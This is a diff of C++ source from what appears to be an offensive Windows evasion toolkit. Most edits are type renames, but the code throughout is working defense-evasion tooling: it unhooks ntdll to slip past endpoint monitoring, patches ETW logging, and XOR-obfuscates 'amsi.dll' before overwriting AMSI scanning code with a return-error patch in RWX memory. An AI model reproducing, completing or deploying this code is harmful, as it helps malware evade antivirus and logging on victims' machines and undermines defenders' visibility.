@@ -1,13 +1,12 @@
 #include "../include/Evasion.h"
-#include <iostream>
 
 VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
-	API->NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
-	API->NtCreateFile = (fn_NtCreateFile)sdGetProcAddress(hNtdll, NT_CREATE_FILE);
-	API->NtCreateSection = (fn_NtCreateSection)sdGetProcAddress(hNtdll, NT_CREATE_SECTION);
-	API->NtMapViewOfSection = (fn_NtMapViewOfSection)sdGetProcAddress(hNtdll, NT_MAP_SECTION_VIEW);
-	API->NtUnmapViewOfSection = (fn_NtUnmapViewOfSection)sdGetProcAddress(hNtdll, NT_UNMAP_SECTION_VIEW);
-	API->NtClose = (fn_NtClose)sdGetProcAddress(hNtdll, NT_CLOSE);
+	API->NtProtectVirtualMemory = (NtProtectVirtualMemory_t)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
+	API->NtCreateFile = (NtCreateFile_t)sdGetProcAddress(hNtdll, NT_CREATE_FILE);
+	API->NtCreateSection = (NtCreateSection_t)sdGetProcAddress(hNtdll, NT_CREATE_SECTION);
+	API->NtMapViewOfSection = (NtMapViewOfSection_t)sdGetProcAddress(hNtdll, NT_MAP_SECTION_VIEW);
+	API->NtUnmapViewOfSection = (NtUnmapViewOfSection_t)sdGetProcAddress(hNtdll, NT_UNMAP_SECTION_VIEW);
+	API->NtClose = (NtClose_t)sdGetProcAddress(hNtdll, NT_CLOSE);
 }
 
 BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
@@ -104,7 +103,7 @@ BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
 }
 
 BOOL sdPatchEtw(PVOID hNtdll) {
-	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
+	NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
 	NTSTATUS status = 0;
 	DWORD dwOldProtect = 0;
 	PBYTE pbPatchMe = nullptr;
@@ -140,8 +139,8 @@ VOID Xor(PCHAR pBuffer, INT iLen) {
 }
 
 BOOL sdPatchAmsi(PVOID hNtdll) {
-	fn_LdrLoadDll LdrLoadDll = nullptr;
-	fn_NtProtectVirtualMemory NtProtectVirtualMemory = nullptr;
+	LdrLoadDll_t LdrLoadDll = nullptr;
+	NtProtectVirtualMemory_t NtProtectVirtualMemory = nullptr;
 	NTSTATUS status = 0;
 	BYTE buff[] = {0x21, 0x2d, 0x32, 0x2a, 0x6e, 0x20, 0x2d, 0x2b};
 	WCHAR wcDecrypted[9] = {};
@@ -153,13 +152,12 @@ BOOL sdPatchAmsi(PVOID hNtdll) {
 	DWORD dwOldProtect = 0;
 	BYTE bPatch[] = { 0xBB, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
-
 	Xor((PCHAR)&buff, 8);
 	sdByteArrayToCharArrayW((PWCHAR)&wcDecrypted, (PBYTE)&buff, 8);
 	sdRtlInitUnicodeString(&ustrDll, wcDecrypted);
 
 	// load amsi.dll
-	LdrLoadDll = (fn_LdrLoadDll)sdGetProcAddress(hNtdll, LDR_GET_DLL);
+	LdrLoadDll = (LdrLoadDll_t)sdGetProcAddress(hNtdll, LDR_LOAD_DLL);
 	status = LdrLoadDll(0, 0, &ustrDll, &hAmsi);
 	if (status != STATUS_SUCCESS && status != STATUS_IMAGE_ALREADY_LOADED) {
 		return FALSE;
@@ -170,7 +168,7 @@ BOOL sdPatchAmsi(PVOID hNtdll) {
 	pbCopy = pbPatchMe;
 
 	// patch
-	NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
+	NtProtectVirtualMemory = (NtProtectVirtualMemory_t)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
 	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbCopy, &size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 	if (status != STATUS_SUCCESS) {
 		return FALSE;
